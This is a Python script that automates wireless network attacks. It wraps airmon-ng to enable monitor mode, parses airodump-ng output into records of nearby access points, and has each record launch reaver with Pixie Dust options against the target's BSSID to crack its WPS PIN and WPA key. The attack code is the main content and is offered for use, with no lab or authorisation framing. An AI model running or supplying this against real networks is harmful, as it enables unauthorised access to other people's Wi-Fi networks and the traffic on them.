import os
import sys
import typing
from atexit import register as on_exit
from contextlib import contextmanager, suppress
from dataclasses import dataclass
from functools import partial
from typing import Optional, Iterator

from plumbum import local, ProcessExecutionError

sudo = local["sudo"]
airmon = sudo[local["airmon-ng"]]
# sudo airodump-ng -i wlan0mon
airodump = sudo[local["airodump-ng"]["-i"]]
reaver = sudo[local["reaver"]]
ip_config = sudo[local["ip"]]

ifaces = partial(os.listdir, '/sys/class/net/')


@dataclass
class Scan:
    bssid: str
    pwr: int
    beacons: int
    data: int
    number_per_sec: int
    megabytes: int
    channel: int
    encryption: Optional[str]
    cipher: Optional[str]
    essid: str

    def attack(self, interface: str = "wlan0mon", timeout: int = 15):
        """
        Attack the target, given an interface and a timeout.

        :param interface:
        :param timeout:
        :return:
        """
        process = reaver("-i", interface, "-b", self.bssid, "-f",
                         "-c", str(self.channel), "-vv", "-K", "-t",
                         str(timeout), "-S")
        for line in iter(process.stdout.readline, ''):
            yield line


def _force_kill_monitor(monitor_interface: str = "wlan0mon"):
    print("[*] Cleaning up", monitor_interface, file=sys.stderr)
    with suppress(ProcessExecutionError):
        airmon("stop", monitor_interface)


on_exit(_force_kill_monitor, os.environ.get("KILL_MONITOR_ON_EXIT", "wlan0mon"))


@contextmanager
def monitor(interface: str, monitor_interface: str = "wlan0mon", force_reload: bool = True):
    _force_kill_monitor(monitor_interface)
    airmon("start", interface)
    ip_config("link", "set", monitor_interface, "up")
    yield
    airmon("stop", monitor_interface)


def dump(interface: str = "wlan0mon") -> Iterator[Scan]:
    from subprocess import Popen, PIPE
    process = Popen(["sudo", "airodump-ng", "-i", interface], stderr=PIPE, stdout=PIPE)
    # Shitty blacklist
    blacklist = [
        b'\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m',
        b'\x1b[0m\x1b[?25l\x1b[2J\x1b[2;1H\x1b[22m\x1b[37m',
        b'\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m',
        b'\x1b[0K\x1b[1B',
        b'\x1b[0K\n',
        b'',
        b'associated)'
    ]
    for line in iter(process.stdout.readline, ''):
        if b":" in line:
            scan = [val for val in line.split(b" ") if val not in blacklist]
            with suppress(ValueError):
                if len(scan) == 11:
                    yield Scan(
                        scan[0].decode("utf-8"),
                        *(int(s) for s in scan[1:7]),
                        *(s.decode("utf-8") for s in scan[8:])
                    )
                if len(scan) == 9:
                    yield Scan(
                        scan[0].decode("utf-8"),
                        *(int(s) for s in scan[1:7]),
                        "",
                        "",
                        scan[-1].decode("utf-8")
                    )


def dump_networks(n: int = 10, interface: str = "wlan0mon") -> typing.Dict[str, Scan]:
    networks = {}
    for scan in dump(interface):
        networks[scan.essid] = scan
        if len(networks) >= n:
            break
    return networks


if __name__ == '__main__':
    with monitor("wlx6cfdb9b29a25"):
        networks = dump_networks(10)
